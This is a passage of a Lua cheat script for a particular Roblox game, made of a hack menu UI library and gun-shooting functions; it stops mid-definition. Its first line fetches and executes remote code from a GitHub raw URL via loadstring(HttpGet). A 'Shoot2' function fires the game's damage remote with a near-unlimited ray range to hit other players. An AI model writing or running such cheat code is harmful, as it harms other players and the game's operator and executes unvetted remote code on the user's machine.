if game.PlaceId == 6441847031 then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZlvXs/backups/refs/heads/main/cottsets.lua"))()
    local UserInputService = game:GetService("UserInputService")
    local plrs = game:GetService'Players'
    local Heartbeat = game:GetService("RunService").Heartbeat
    local plr = plrs.LocalPlayer
    local mouse = plr:GetMouse()
    local rep = game:GetService'ReplicatedStorage'
    local uis = game:GetService'UserInputService'
    local ts = game:GetService'TweenService'
    local rs = game:GetService'RunService'
    local HitpartTable = {"Head", "HumanoidRootPart", "Left Arm", "Right Arm", "Right Leg", "Left Leg"}
    local inputService   = game:GetService("UserInputService")
    local runService     = game:GetService("RunService")
    local tweenService   = game:GetService("TweenService")
    local players        = game:GetService("Players")
    local localPlayer    = players.LocalPlayer
    local mouse          = localPlayer:GetMouse()
    local menu           = game:GetObjects("rbxassetid://12702460854")[1]
    local Player = game:GetService("Players").LocalPlayer
    local Mouse = Player:GetMouse()
    local plr22 = game.Players.LocalPlayer
    local mouse = plr22:GetMouse()
    local Players = game:GetService("Players")

    local SafeZone = Instance.new("Part")
    SafeZone.Size = Vector3.new(100000,2, 100000)
    SafeZone.Transparency = 0.70
    SafeZone.Anchored = true
    SafeZone.CanCollide = true
    SafeZone.Position = Vector3.new(100000, 100000, 100000)
    SafeZone.Parent = game.Workspace
    SafeZone.Material = "Salt"

    local function AddCd(tool,Cd)
        local cd = Instance.new('IntValue',tool)
        cd.Name = 'ClientCD'
        game.Debris:AddItem(cd,Cd)
    end

    local function KeyCodeToString(keycode)
        local str = game:GetService("UserInputService"):GetStringForKeyCode(keycode)
        return (str and str ~= "") and str or tostring(keycode):gsub("Enum.KeyCode.", "")
    end

    local function isWithinDistance(player, target, maxDistance)
        if player and player.Character and target and target.Character then
            local playerPosition = player.Character:FindFirstChild("HumanoidRootPart").Position
            local targetPosition = target.Character:FindFirstChild("HumanoidRootPart").Position
            local distance = (playerPosition - targetPosition).Magnitude
            return distance <= maxDistance
        end
        return false
    end

    local function Shoot(firstPos,nextPos,Revolver)
        if Revolver:FindFirstChild'Barrel' and Revolver.Barrel:FindFirstChild'Attachment' then
            if Revolver.Barrel.Attachment:FindFirstChild'Sound' then
                local SoundClone = Revolver.Barrel.Attachment.Sound:Clone()
                SoundClone.Name = 'Uncopy'
                SoundClone.Parent = Revolver.Barrel.Attachment
                SoundClone:Play()
                game.Debris:AddItem(SoundClone, 1)
            end
            local FilterTable = {}
            table.insert(FilterTable, plr.Character)
            table.insert(FilterTable, game.Workspace['Target Filter'])
            for _, v in pairs(game.Workspace:GetDescendants()) do
                if v.ClassName == 'Accessory' then
                    table.insert(FilterTable, v)
                end
            end
            local a_1, a_2, a_3 = game.Workspace:FindPartOnRayWithIgnoreList(Ray.new(firstPos, (nextPos - firstPos).Unit * 100), FilterTable)
            local BulletCl = rep['Revolver Bullet']:Clone()
            game.Debris:AddItem(BulletCl, 1)
            BulletCl.Parent = game.Workspace['Target Filter']
            local mg = (firstPos - a_2).Magnitude
            BulletCl.Size = Vector3.new(0.2, 0.2, mg)
            BulletCl.CFrame = CFrame.new(firstPos, nextPos) * CFrame.new(0, 0, -mg / 2)
            ts:Create(BulletCl, TweenInfo.new(0.4, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {
                Size = Vector3.new(0.06, 0.06, mg), 
                Transparency = 1
            }):Play()
            if a_1 then
                local expPart = Instance.new'Part'
                game.Debris:AddItem(expPart, 1)
                expPart.Name = 'Exploding Neon Part'
                expPart.Anchored = true
                expPart.CanCollide = true
                expPart.Shape = 'Ball'
                expPart.Material = Enum.Material.Neon
                expPart.BrickColor = BulletCl.BrickColor
                expPart.Size = Vector3.new(0.1, 0.1, 0.1)
                expPart.Parent = game.Workspace['Target Filter']
                expPart.Position = a_2
                ts:Create(expPart, TweenInfo.new(0.3, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {
                    Size = Vector3.new(2, 2, 2), 
                    Transparency = 1
                }):Play()
                if Revolver:FindFirstChild'DamageRemote' and a_1.Parent:FindFirstChild'Humanoid' then
                    Revolver.DamageRemote:FireServer(a_1.Parent.Humanoid)
                end
            end
        end
    end

    local function Shoot2(firstPos,nextPos,Revolver)
        if Revolver:FindFirstChild'Barrel' and Revolver.Barrel:FindFirstChild'Attachment' then
            if Revolver.Barrel.Attachment:FindFirstChild'Sound' then
                local SoundClone = Revolver.Barrel.Attachment.Sound:Clone()
                SoundClone.Name = 'Uncopy'
                SoundClone.Parent = Revolver.Barrel.Attachment
                SoundClone:Play()
                game.Debris:AddItem(SoundClone, 1)
            end
            local FilterTable = {}
            table.insert(FilterTable, plr.Character)
            table.insert(FilterTable, game.Workspace['Target Filter'])
            for _, v in pairs(game.Workspace:GetDescendants()) do
                if v.ClassName == 'Accessory' then
                    table.insert(FilterTable, v)
                end
            end
            local a_1, a_2, a_3 = game.Workspace:FindPartOnRayWithIgnoreList(Ray.new(firstPos, (nextPos - firstPos).Unit * 9999999999999999999), FilterTable)
            local BulletCl = rep['Revolver Bullet']:Clone()
            game.Debris:AddItem(BulletCl, 1)
            BulletCl.Parent = game.Workspace['Target Filter']
            local mg = (firstPos - a_2).Magnitude
            BulletCl.Size = Vector3.new(0.2, 0.2, mg)
            BulletCl.CFrame = CFrame.new(firstPos, nextPos) * CFrame.new(0, 0, -mg / 2)
            ts:Create(BulletCl, TweenInfo.new(0.4, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {
                Size = Vector3.new(0.06, 0.06, mg), 
                Transparency = 1
            }):Play()
            if a_1 then
                local expPart = Instance.new'Part'
                game.Debris:AddItem(expPart, 1)
                expPart.Name = 'Exploding Neon Part'
                expPart.Anchored = true
                expPart.CanCollide = true
                expPart.Shape = 'Ball'
                expPart.Material = Enum.Material.Neon
                expPart.BrickColor = BulletCl.BrickColor
                expPart.Size = Vector3.new(0.1, 0.1, 0.1)
                expPart.Parent = game.Workspace['Target Filter']
                expPart.Position = a_2
                ts:Create(expPart, TweenInfo.new(0.3, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {
                    Size = Vector3.new(2, 2, 2), 
                    Transparency = 1
                }):Play()
                if Revolver:FindFirstChild'DamageRemote' and a_1.Parent:FindFirstChild'Humanoid' then
                    Revolver.DamageRemote:FireServer(a_1.Parent.Humanoid)
                end
            end
        end
    end

    local library = {
        cheatname = "";
        ext = "";
        gamename = "";
        colorpicking = false;
        tabbuttons = {};
        tabs = {};
        options = {};
        flags = {};
        scrolling = false;
        notifyText = Drawing.new("Text");
        playing = false;
        multiZindex = 200;
        toInvis = {};
        libColor = Color3.fromRGB(240, 142, 214);
        disabledcolor = Color3.fromRGB(233, 0, 0);
        blacklisted = {
            Enum.KeyCode.W,
            Enum.KeyCode.A,
            Enum.KeyCode.S,
            Enum.KeyCode.D,
            Enum.UserInputType.MouseMovement
        }
    }

    function draggable(a)local b=inputService;local c;local d;local e;local f;local function g(h)if not library.colorpicking then local i=h.Position-e;a.Position=UDim2.new(f.X.Scale,f.X.Offset+i.X,f.Y.Scale,f.Y.Offset+i.Y)end end;a.InputBegan:Connect(function(h)if h.UserInputType==Enum.UserInputType.MouseButton1 or h.UserInputType==Enum.UserInputType.Touch then c=true;e=h.Position;f=a.Position;h.Changed:Connect(function()if h.UserInputState==Enum.UserInputState.End then c=false end end)end end)a.InputChanged:Connect(function(h)if h.UserInputType==Enum.UserInputType.MouseMovement or h.UserInputType==Enum.UserInputType.Touch then d=h end end)b.InputChanged:Connect(function(h)if h==d and c then g(h)end end)end
    draggable(menu.bg)

    local tabholder = menu.bg.bg.bg.bg.main.group
    local tabviewer = menu.bg.bg.bg.bg.tabbuttons

    library.notifyText.Visible = false
    library.notifyText.Font = 2
    library.notifyText.Size = 16
    library.notifyText.Outline = true
    library.notifyText.Color = Color3.new(1,1,1)
    library.notifyText.Position = Vector2.new(10,60)

    function library:Tween(...)
        tweenService:Create(...):Play()
    end

    function library:notify(text)
        if playing then return end
        playing = true
        library.notifyText.Text = text
        library.notifyText.Transparency = 0
        library.notifyText.Visible = true
        for i = 0,1,0.1 do wait()
            library.notifyText.Transparency = i
        end
        spawn(function()
            wait(3)
            for i = 1,0,-0.1 do wait()
                library.notifyText.Transparency = i
            end
            playing = false
            library.notifyText.Visible = false
        end)
    end

    menu.bg.Position     = UDim2.new(0.5,-menu.bg.Size.X.Offset/2,0.5,-menu.bg.Size.Y.Offset/2)
    menu.Parent          = game:GetService("CoreGui")

    inputService.InputEnded:Connect(function(key)
        if key.KeyCode == Enum.KeyCode.KeypadOne then
            menu.Enabled = not menu.Enabled
            library.scrolling = false
            library.colorpicking = false
            for i,v in next, library.toInvis do
                v.Visible = false
            end
        end
    end)

    local keyNames = {
        [Enum.KeyCode.LeftAlt] = 'LALT';
        [Enum.KeyCode.RightAlt] = 'RALT';
        [Enum.KeyCode.LeftControl] = 'LCTRL';
        [Enum.KeyCode.RightControl] = 'RCTRL';
        [Enum.KeyCode.LeftShift] = 'LSHIFT';
        [Enum.KeyCode.RightShift] = 'RSHIFT';
        [Enum.KeyCode.Underscore] = '_';
        [Enum.KeyCode.Minus] = '-';
        [Enum.KeyCode.Plus] = '+';
        [Enum.KeyCode.Period] = '.';
        [Enum.KeyCode.Slash] = '/';
        [Enum.KeyCode.BackSlash] = '\\';
        [Enum.KeyCode.Question] = '?';
        [Enum.UserInputType.MouseButton1] = 'MB1';
        [Enum.UserInputType.MouseButton2] = 'MB2';
        [Enum.UserInputType.MouseButton3] = 'MB3';
    }

    function library:addTab(name)
        local newTab = tabholder.tab:Clone()
        local newButton = tabviewer.button:Clone()

        table.insert(library.tabs,newTab)
        newTab.Parent = tabholder
        newTab.Visible = false

        table.insert(library.tabbuttons,newButton)
        newButton.Parent = tabviewer
        newButton.Modal = true
        newButton.Visible = true
        newButton.text.Text = name
        newButton.MouseButton1Click:Connect(function()
            for i,v in next, library.tabs do
                v.Visible = v == newTab
            end
            for i,v in next, library.toInvis do
                v.Visible = false
            end
            for i,v in next, library.tabbuttons do
                local state = v == newButton
                if state then
                    v.element.Visible = true
                    library:Tween(v.element, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.000})
                    v.text.TextColor3 = Color3.fromRGB(244, 244, 244)
                else
                    library:Tween(v.element, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1.000})
                    v.text.TextColor3 = Color3.fromRGB(144, 144, 144)
                end
            end
        end)

        local tab = {}
        local groupCount = 0
        local jigCount = 0
        local topStuff = 2000
    
        function tab:createGroup(pos,groupname)
            local groupbox = Instance.new("Frame")
            local grouper = Instance.new("Frame")
            local UIListLayout = Instance.new("UIListLayout")
            local UIPadding = Instance.new("UIPadding")
            local element = Instance.new("Frame")
            local title = Instance.new("TextLabel")
            local backframe = Instance.new("Frame")

            groupCount -= 1

            groupbox.Parent = newTab[pos]
            groupbox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            groupbox.BorderColor3 = Color3.fromRGB(30, 30, 30)
            groupbox.BorderSizePixel = 2
            groupbox.Size = UDim2.new(0, 211, 0, 8)
            groupbox.ZIndex = groupCount

            grouper.Parent = groupbox
            grouper.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            grouper.BorderColor3 = Color3.fromRGB(0, 0, 0)
            grouper.Size = UDim2.new(1, 0, 1, 0)

            UIListLayout.Parent = grouper
            UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
            UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

            UIPadding.Parent = grouper
            UIPadding.PaddingBottom = UDim.new(0, 4)
            UIPadding.PaddingTop = UDim.new(0, 7)

            element.Name = "element"
            element.Parent = groupbox
            element.BackgroundColor3 = library.libColor
            element.BorderSizePixel = 0
            element.Size = UDim2.new(1, 0, 0, 1)

            title.Parent = groupbox
            title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            title.BackgroundTransparency = 1.000
            title.BorderSizePixel = 0
            title.Position = UDim2.new(0, 17, 0, 0)
            title.ZIndex = 2
            title.Font = Enum.Font.Code
            title.Text = groupname or ""
            title.TextColor3 = Color3.fromRGB(255, 255, 255)
            title.TextSize = 13.000
            title.TextStrokeTransparency = 0.000
            title.TextXAlignment = Enum.TextXAlignment.Left

            backframe.Parent = groupbox
            backframe.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            backframe.BorderSizePixel = 0
            backframe.Position = UDim2.new(0, 10, 0, -2)
            backframe.Size = UDim2.new(0, 13 + title.TextBounds.X, 0, 3)

            local group = {}
            function group:addToggle(args)
                if not args.flag and args.text then args.flag = args.text end
                if not args.flag then return warn("⚠️ incorrect arguments ⚠️ - missing args on recent toggle") end
                groupbox.Size += UDim2.new(0, 0, 0, 20)

                local toggleframe = Instance.new("Frame")
                local tobble = Instance.new("Frame")
                local mid = Instance.new("Frame")
                local front = Instance.new("Frame")
                local text = Instance.new("TextLabel")
                local button = Instance.new("TextButton")

                jigCount -= 1
                library.multiZindex -= 1

                toggleframe.Name = "toggleframe"
                toggleframe.Parent = grouper
                toggleframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                toggleframe.BackgroundTransparency = 1.000
                toggleframe.BorderSizePixel = 0
                toggleframe.Size = UDim2.new(1, 0, 0, 20)
                toggleframe.ZIndex = library.multiZindex
                
                tobble.Name = "tobble"
                tobble.Parent = toggleframe
                tobble.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                tobble.BorderColor3 = Color3.fromRGB(0, 0, 0)
                tobble.BorderSizePixel = 3
                            tobble.Position = UDim2.new(0.0299999993, 0, 0.272000015, 0)

                tobble.Size = UDim2.new(0, 10, 0, 10)
                
                mid.Name = "mid"
                mid.Parent = tobble
                mid.BackgroundColor3 = Color3.fromRGB(69, 23, 255)
                mid.BorderColor3 = Color3.fromRGB(30,30,30)
                mid.BorderSizePixel = 2
                mid.Size = UDim2.new(0, 10, 0, 10)
                
                front.Name = "front"
                front.Parent = mid
                front.BackgroundColor3 = Color3.fromRGB(15,15,15)
                front.BorderColor3 = Color3.fromRGB(0, 0, 0)
                front.Size = UDim2.new(0, 10, 0, 10)
                
                text.Name = "text"
                text.Parent = toggleframe
                text.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
                text.BackgroundTransparency = 1.000
                text.Position = UDim2.new(0, 22, 0, 0)
                text.Size = UDim2.new(0, 0, 1, 2)
                text.Font = Enum.Font.Code
                text.Text = args.text or args.flag
                text.TextColor3 = Color3.fromRGB(155, 155, 155)
                text.TextSize = 13.000
                text.TextStrokeTransparency = 0.000
                text.TextXAlignment = Enum.TextXAlignment.Left
                
                button.Name = "button"
                button.Parent = toggleframe
                button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

                button.BackgroundTransparency = 1.000
                button.BorderSizePixel = 0
                button.Size = UDim2.new(0, 101, 1, 0)
                button.Font = Enum.Font.SourceSans
                button.Text = ""
                button.TextColor3 = Color3.fromRGB(0, 0, 0)
                button.TextSize = 14.000

                if args.disabled then
                    button.Visible = false
                    text.TextColor3 = library.disabledcolor
                    text.Text = args.text
                return end

                local state = false
                function toggle(newState)
                    state = newState
                    library.flags[args.flag] = state
                    front.BackgroundColor3 = state and library.libColor or Color3.fromRGB(15,15,15)
                    text.TextColor3 = state and Color3.fromRGB(244, 244, 244) or Color3.fromRGB(144, 144, 144)
                    if args.callback then
                        args.callback(state)
                    end
                end
                button.MouseButton1Click:Connect(function()
                    state = not state
                    front.Name = state and "accent" or "back"
                    library.flags[args.flag] = state
                    mid.BorderColor3 = Color3.fromRGB(30,30,30)
                    front.BackgroundColor3 = state and library.libColor or Color3.fromRGB(15,15,15)
                    text.TextColor3 = state and Color3.fromRGB(244, 244, 244) or Color3.fromRGB(144, 144, 144)
                    if args.callback then
                        args.callback(state)
                    end
                end)
                button.MouseEnter:connect(function()
                    mid.BorderColor3 = library.libColor
                end)
                button.MouseLeave:connect(function()
                    mid.BorderColor3 = Color3.fromRGB(30,30,30)
                end)

                library.flags[args.flag] = false
                library.options[args.flag] = {type = "toggle",changeState = toggle,skipflag = args.skipflag,oldargs = args}
                local toggle = {}
                function toggle:addKeybind(args)
                    if not args.flag then return warn("⚠️ incorrect arguments ⚠️ - missing args on toggle:keybind") end
                    local next = false
                    
                    local keybind = Instance.new("Frame")
                    local button = Instance.new("TextButton")

                    keybind.Parent = toggleframe
                    keybind.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                    keybind.BackgroundTransparency = 1.000
                    keybind.BorderColor3 = Color3.fromRGB(0, 0, 0)
                    keybind.BorderSizePixel = 0
                    keybind.Position = UDim2.new(0.720000029, 4, 0.272000015, 0)
                    keybind.Size = UDim2.new(0, 51, 0, 10)
                    
                    button.Parent = keybind
                    button.BackgroundColor3 = Color3.fromRGB(187, 131, 255)
                    button.BackgroundTransparency = 1.000
                    button.BorderSizePixel = 0
                    button.Position = UDim2.new(-0.270902753, 0, 0, 0)
                    button.Size = UDim2.new(1.27090275, 0, 1, 0)
                    button.Font = Enum.Font.Code
                    button.Text = ""
                    button.TextColor3 = Color3.fromRGB(155, 155, 155)
                    button.TextSize = 13.000
                    button.TextStrokeTransparency = 0.000
                    button.TextXAlignment = Enum.TextXAlignment.Right
        
                    function updateValue(val)
                        if library.colorpicking then return end
                        library.flags[args.flag] = val
                        button.Text = keyNames[val] or val.Name
                    end
                    inputService.InputBegan:Connect(function(key)
                        local key = key.KeyCode == Enum.KeyCode.Unknown and key.UserInputType or key.KeyCode
                        if next then
                            if not table.find(library.blacklisted,key) then
                                next = false
                                library.flags[args.flag] = key
                                button.Text = keyNames[key] or key.Name
                                button.TextColor3 = Color3.fromRGB(155, 155, 155)
                            end
                        end
                        if not next and key == library.flags[args.flag] and args.callback then
                            args.callback()
                        end
                    end)
        
                    button.MouseButton1Click:Connect(function()
                        if library.colorpicking then return end
                        library.flags[args.flag] = Enum.KeyCode.Unknown
                        button.Text = "--"
                        button.TextColor3 = library.libColor
                        next = true
                    end)
        
                    library.flags[args.flag] = Enum.KeyCode.Unknown
                    library.options[args.flag] = {type = "keybind",changeState = updateValue,skipflag = args.skipflag,oldargs = args}
        
                    updateValue(args.key or Enum.KeyCode.Unknown)
                end
                function toggle:addColorpicker(args)
                    if not args.flag and args.text then args.flag = args.text end
                    if not args.flag then return warn("⚠️ incorrect arguments ⚠️") end
                    local colorpicker = Instance.new("Frame")
                    local mid = Instance.new("Frame")
                    local front = Instance.new("Frame")
                    local button2 = Instance.new("TextButton")
                    local colorFrame = Instance.new("Frame")
                    local colorFrame_2 = Instance.new("Frame")
                    local hueframe = Instance.new("Frame")
                    local main = Instance.new("Frame")
                    local hue = Instance.new("ImageLabel")
                    local pickerframe = Instance.new("Frame")
                    local main_2 = Instance.new("Frame")
                    local picker = Instance.new("ImageLabel")
                    local clr = Instance.new("Frame")
                    local copy = Instance.new("TextButton")

                    library.multiZindex -= 1
                    jigCount -= 1
                    topStuff -= 1

                    colorpicker.Parent = toggleframe
                    colorpicker.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                    colorpicker.BorderColor3 = Color3.fromRGB(0, 0, 0)
                    colorpicker.BorderSizePixel = 3
                    colorpicker.Position = args.second and UDim2.new(0.720000029, 4, 0.272000015, 0) or UDim2.new(0.860000014, 4, 0.272000015, 0)
                    colorpicker.Size = UDim2.new(0, 20, 0, 10)
                    
                    mid.Name = "mid"
                    mid.Parent = colorpicker
                    mid.BackgroundColor3 = Color3.fromRGB(69, 23, 255)
                    mid.BorderColor3 = Color3.fromRGB(30,30,30)
                    mid.BorderSizePixel = 2
                    mid.Size = UDim2.new(1, 0, 1, 0)
                    
                    front.Name = "front"
                    front.Parent = mid
                    front.BackgroundColor3 = Color3.fromRGB(240, 142, 214)
                    front.BorderColor3 = Color3.fromRGB(0, 0, 0)
                    front.Size = UDim2.new(1, 0, 1, 0)
                    
                    button2.Name = "button2"
                    button2.Parent = front
                    button2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                    button2.BackgroundTransparency = 1.000
                    button2.Size = UDim2.new(1, 0, 1, 0)
                    button2.Text = ""
                    button2.Font = Enum.Font.SourceSans
                    button2.TextColor3 = Color3.fromRGB(0, 0, 0)
                    button2.TextSize = 14.000

                    colorFrame.Name = "colorFrame"
                    colorFrame.Parent = toggleframe
                    colorFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                    colorFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
                    colorFrame.BorderSizePixel = 2
                    colorFrame.Position = UDim2.new(0.101092957, 0, 0.75, 0)
                    colorFrame.Size = UDim2.new(0, 137, 0, 128)

                    colorFrame_2.Name = "colorFrame"
                    colorFrame_2.Parent = colorFrame
                    colorFrame_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
                    colorFrame_2.BorderColor3 = Color3.fromRGB(60, 60, 60)
                    colorFrame_2.Size = UDim2.new(1, 0, 1, 0)

                    hueframe.Name = "hueframe"
                    hueframe.Parent = colorFrame_2
                    hueframe.Parent = colorFrame_2
                    hueframe.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
                    hueframe.BorderColor3 = Color3.fromRGB(60, 60, 60)
                    hueframe.BorderSizePixel = 2
                    hueframe.Position = UDim2.new(-0.0930000022, 18, -0.0599999987, 30)
                    hueframe.Size = UDim2.new(0, 100, 0, 100)
        
                    main.Name = "main"
                    main.Parent = hueframe
                    main.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
                    main.BorderColor3 = Color3.fromRGB(0, 0, 0)
                    main.Size = UDim2.new(0, 100, 0, 100)
                    main.ZIndex = 6
        
                    picker.Name = "picker"
                    picker.Parent = main
                    picker.BackgroundColor3 = Color3.fromRGB(232, 0, 255)
                    picker.BorderColor3 = Color3.fromRGB(0, 0, 0)
                    picker.BorderSizePixel = 0
                    picker.Size = UDim2.new(0, 100, 0, 100)
                    picker.ZIndex = 104
                    picker.Image = "rbxassetid://2615689005"
        
                    pickerframe.Name = "pickerframe"
                    pickerframe.Parent = colorFrame
                    pickerframe.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
                    pickerframe.BorderColor3 = Color3.fromRGB(60, 60, 60)
                    pickerframe.BorderSizePixel = 2
                    pickerframe.Position = UDim2.new(0.711000025, 14, -0.0599999987, 30)
                    pickerframe.Size = UDim2.new(0, 20, 0, 100)
        
                    main_2.Name = "main"
                    main_2.Parent = pickerframe
                    main_2.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
                    main_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
                    main_2.Size = UDim2.new(0, 20, 0, 100)
                    main_2.ZIndex = 6
        
                    hue.Name = "hue"
                    hue.Parent = main_2
                    hue.BackgroundColor3 = Color3.fromRGB(255, 0, 178)
                    hue.BorderColor3 = Color3.fromRGB(0, 0, 0)
                    hue.BorderSizePixel = 0
                    hue.Size = UDim2.new(0, 20, 0, 100)
                    hue.ZIndex = 104
                    hue.Image = "rbxassetid://2615692420"
        
                    clr.Name = "clr"
                    clr.Parent = colorFrame
                    clr.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                    clr.BackgroundTransparency = 1.000
                    clr.BorderColor3 = Color3.fromRGB(60, 60, 60)
                    clr.BorderSizePixel = 2
                    clr.Position = UDim2.new(0.0280000009, 0, 0, 2)
                    clr.Size = UDim2.new(0, 129, 0, 14)
                    clr.ZIndex = 5
        
                    copy.Name = "copy"
                    copy.Parent = clr
                    copy.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
                    copy.BackgroundTransparency = 1.000
                    copy.BorderSizePixel = 0
                    copy.Size = UDim2.new(0, 129, 0, 14)
                    copy.ZIndex = 5
                    copy.Font = Enum.Font.SourceSans
                    copy.Text = args.text or args.flag
                    copy.TextColor3 = Color3.fromRGB(100, 100, 100)
                    copy.TextSize = 14.000
                    copy.TextStrokeTransparency = 0.000

                    copy.MouseButton1Click:Connect(function() 
                        colorFrame.Visible = false
                    end)

                    button2.MouseButton1Click:Connect(function()
                        colorFrame.Visible = not colorFrame.Visible
                        mid.BorderColor3 = Color3.fromRGB(30,30,30)
                    end)

                    button2.MouseEnter:connect(function()
                        mid.BorderColor3 = library.libColor
                    end)
                    button2.MouseLeave:connect(function()
                        mid.BorderColor3 = Color3.fromRGB(30,30,30)
                    end)

                    local function updateValue(value,fakevalue)
                        if typeof(value) == "table" then value = fakevalue end
                        library.flags[args.flag] = value
                        front.BackgroundColor3 = value
                        if args.callback then
                            args.callback(value)
                        end
                    end

                    local white, black = Color3.new(1,1,1), Color3.new(0,0,0)
                    local colors = {Color3.new(1,0,0),Color3.new(1,1,0),Color3.new(0,1,0),Color3.new(0,1,1),Color3.new(0,0,1),Color3.new(1,0,1),Color3.new(1,0,0)}
                    local heartbeat = game:GetService("RunService").Heartbeat

                    local pickerX,pickerY,hueY = 0,0,0
                    local oldpercentX,oldpercentY = 0,0

                    hue.MouseEnter:Connect(function()
                        local input = hue.InputBegan:connect(function(key)
                            if key.UserInputType == Enum.UserInputType.MouseButton1 then
                                while heartbeat:wait() and inputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
                                    library.colorpicking = true
                                    local percent = (hueY-hue.AbsolutePosition.Y-36)/hue.AbsoluteSize.Y
                                    local num = math.max(1, math.min(7,math.floor(((percent*7+0.5)*100))/100))
                                    local startC = colors[math.floor(num)]
                                    local endC = colors[math.ceil(num)]
                                    local color = white:lerp(picker.BackgroundColor3, oldpercentX):lerp(black, oldpercentY)
                                    picker.BackgroundColor3 = startC:lerp(endC, num-math.floor(num)) or Color3.new(0, 0, 0)
                                    updateValue(color)
                                end
                                library.colorpicking = false
                            end
                        end)
                        local leave
                        leave = hue.MouseLeave:connect(function()
                            input:disconnect()
                            leave:disconnect()
                        end)
                    end)

                    picker.MouseEnter:Connect(function()
                        local input = picker.InputBegan:connect(function(key)
                            if key.UserInputType == Enum.UserInputType.MouseButton1 then
                                while heartbeat:wait() and inputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
                                    library.colorpicking = true
                                    local xPercent = (pickerX-picker.AbsolutePosition.X)/picker.AbsoluteSize.X
                                    local yPercent = (pickerY-picker.AbsolutePosition.Y-36)/picker.AbsoluteSize.Y
                                    local color = white:lerp(picker.BackgroundColor3, xPercent):lerp(black, yPercent)
                                    updateValue(color)
                                    oldpercentX,oldpercentY = xPercent,yPercent
                                end
                                library.colorpicking = false
                            end
                        end)
                        local leave
                        leave = picker.MouseLeave:connect(function()
                            input:disconnect()
                            leave:disconnect()
                        end)
                    end)

                    hue.MouseMoved:connect(function(_, y)
                        hueY = y
                    end)

                    picker.MouseMoved:connect(function(x, y)
                        pickerX,pickerY = x,y
                    end)

                    table.insert(library.toInvis,colorFrame)
                    library.flags[args.flag] = Color3.new(1,1,1)
                    library.options[args.flag] = {type = "colorpicker",changeState = updateValue,skipflag = args.skipflag,oldargs = args}

                    updateValue(args.color or Color3.new(1,1,1))
                end
                return toggle
            end
            function group:addButton(args)
                if not args.callback or not args.text then return warn("⚠️ incorrect arguments ⚠️") end
                groupbox.Size += UDim2.new(0, 0, 0, 22)

                local buttonframe = Instance.new("Frame")
                local bg = Instance.new("Frame")
                local main = Instance.new("Frame")
                local button = Instance.new("TextButton")
                local gradient = Instance.new("UIGradient")

                buttonframe.Name = "buttonframe"
                buttonframe.Parent = grouper
                buttonframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                buttonframe.BackgroundTransparency = 1.000
                buttonframe.BorderSizePixel = 0
                buttonframe.Size = UDim2.new(1, 0, 0, 21)
                
                bg.Name = "bg"
                bg.Parent = buttonframe
                bg.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                bg.BorderColor3 = Color3.fromRGB(0, 0, 0)
                bg.BorderSizePixel = 2
                bg.Position = UDim2.new(0.02, -1, 0, 0)
                bg.Size = UDim2.new(0, 205, 0, 15)
                
                main.Name = "main"
                main.Parent = bg
                main.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                main.BorderColor3 = Color3.fromRGB(60, 60, 60)
                main.Size = UDim2.new(1, 0, 1, 0)
                
                button.Name = "button"
                button.Parent = main
                button.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                button.BackgroundTransparency = 1.000
                button.BorderSizePixel = 0
                button.Size = UDim2.new(1, 0, 1, 0)
                button.Font = Enum.Font.Code
                button.Text = args.text or args.flag
                button.TextColor3 = Color3.fromRGB(255, 255, 255)
                button.TextSize = 13.000
                button.TextStrokeTransparency = 0.000
                
                gradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(105, 105, 105)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(121, 121, 121))}
                gradient.Rotation = 90
                gradient.Name = "gradient"
                gradient.Parent = main

                button.MouseButton1Click:Connect(function()
                    if not library.colorpicking then
                        args.callback()
                    end
                end)
                button.MouseEnter:connect(function()
                    main.BorderColor3 = library.libColor
                end)
                button.MouseLeave:connect(function()
                    main.BorderColor3 = Color3.fromRGB(60, 60, 60)
                end)
            end
            function group:addSlider(args,sub)
                if not args.flag or not args.max then return warn("⚠️ incorrect arguments ⚠️") end
                groupbox.Size += UDim2.new(0, 0, 0, 30)

                local slider = Instance.new("Frame")
                local bg = Instance.new("Frame")
                local main = Instance.new("Frame")
                local fill = Instance.new("Frame")
                local button = Instance.new("TextButton")
                local valuetext = Instance.new("TextLabel")
                local UIGradient = Instance.new("UIGradient")
                local text = Instance.new("TextLabel")

                slider.Name = "slider"
                slider.Parent = grouper
                slider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                slider.BackgroundTransparency = 1.000
                slider.BorderSizePixel = 0
                slider.Size = UDim2.new(1, 0, 0, 30)
                
                bg.Name = "bg"
                bg.Parent = slider
